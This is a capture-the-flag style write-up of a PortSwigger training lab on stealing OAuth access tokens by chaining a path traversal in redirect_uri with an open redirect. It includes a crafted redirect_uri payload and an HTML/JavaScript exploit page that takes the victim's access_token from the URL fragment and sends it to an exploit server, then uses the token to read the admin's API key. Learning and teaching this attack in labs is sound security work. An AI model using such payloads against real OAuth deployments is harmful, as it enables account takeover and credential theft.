# Stealing OAuth access tokens via an open redirect

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect), you'll learn: Stealing OAuth access tokens via an open redirect! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses an [OAuth](https://portswigger.net/web-security/oauth) service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

> Note
>  
> You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: `wiener:peter`.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042231.png)

In here, we see a link called "My account".

Let's try to login by clicking that link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042312.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042320.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042331.png)

As you can see, when we clicked on the "My account" link, it'll redirect us to login with a social account, which means this is an OAuth authentication.

In the `/auth` request, there are some parameters:

- `client_id`: `umg56k6htndwh95zhjmgd`
- `redirect_uri`: `https://0a0000b304ad9179c28dc70f00dd002d.web-security-academy.net/oauth-callback`
- `response_type`: `token`
- `nonce`: `-678410678`
- `scope`: `openid profile email`

The `response_type` parameter indicates that **it's using implicit grant type.**

Let's continue the OAuth flow:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042636.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042647.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042736.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042742.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107042759.png)

**As you can see, the `/me` GET request has the `apikey`.**

Armed with above information, we can try to modify the `redirect_uri` parameter to leak the `apikey`.

To do so, I'll log out, and send the `/auth` GET request to Burp Suite's Repeater. Then modify the `redirect_uri` parameter to the exploit server:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107043143.png)

Hmm... Looks like there are some whitelisted domain in `redirect_uri` parameter?

We can try to bypass it.

For example, using the `@`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107043305.png)

Nope.

How about parameter pollution?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107043406.png)

No luck.

It seems like we couldn't bypass it.

How about path traversal?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107043627.png)

We can!

However, we still couldn't leak the `apikey`. **We need to find another vulnerbility to do that, such as open redirect.**

After poking around the website, I found that in the home page, we can view different posts, and we can navigate to different posts:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107044425.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107044433.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107044448.png)

When we clicked the "Next post" link, **it'll send a GET request to `/post/next` with parameter `path`.**

Let's test for open redirect:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107044556.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107044610.png)

**It redirects me to any website! So it's vulnerable to open redirect.**

Armed with above information, **we can chain the `redirect_uri` parameter and open redirect vulnerability together!**

```
redirect_uri=https://0a0000b304ad9179c28dc70f00dd002d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab400c304dc91a2c26dc6f80184009b.exploit-server.net/log
```

**The above payload will set the `redirect_uri` parameter value to `/post/next`, with parameter `path`, and it's value is our exploit server. This allows us to extract the `access_token`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107045501.png)

**Then, we can use that `access_token` to send a GET requesto to `/me`, which will finally leak the `apikey`.**

Now, we can test the payload works or not:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107045742.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107045752.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107045801.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107045835.png)

It worked!

However, since the OAuth grant type is using implicit, we need to extract the `access_token` via the URL fragment.

**Now, we can craft a payload that extract victim's `access_token`:**
```html
<html>
    <head>
        <title>OAuth-4</title>
    </head>
    <body>
        <script>
            // Check the URL fragment exist or not
            if (document.location.hash == ''){
                // If not exist, redirect to the payload, so we can extract the access_token
                window.location.replace('https://oauth-0ada00a904369151c2bdc54b02480071.web-security-academy.net/auth?client_id=umg56k6htndwh95zhjmgd&redirect_uri=https://0a0000b304ad9179c28dc70f00dd002d.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0ab400c304dc91a2c26dc6f80184009b.exploit-server.net/exploit&response_type=token&nonce=171654770&scope=openid%20profile%20email');
            } else {
                // Create a new object called urlSearchParams, which extract the URL fragment
                const urlSearchParams = new URLSearchParams(document.location.hash.substr(1));
                // Extract the access_token
                var token = urlSearchParams.get('access_token');

                // Redirect to /log with the access_token value
                window.location.replace('/log?access_token=' + token);
            };
        </script>
    </body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107053312.png)

Exploit server access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107053348.png)

Nice! We got it!

**Finally, we can send a GET request to `/me`, with header `Authorization: Bearer <access_token>`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107053458.png)

Nice! Let's submit the `apikey`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107053524.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OAuth-Authentication/OAuth-4/images/Pasted%20image%2020230107053531.png)

# What we've learned:

1. Stealing OAuth access tokens via an open redirect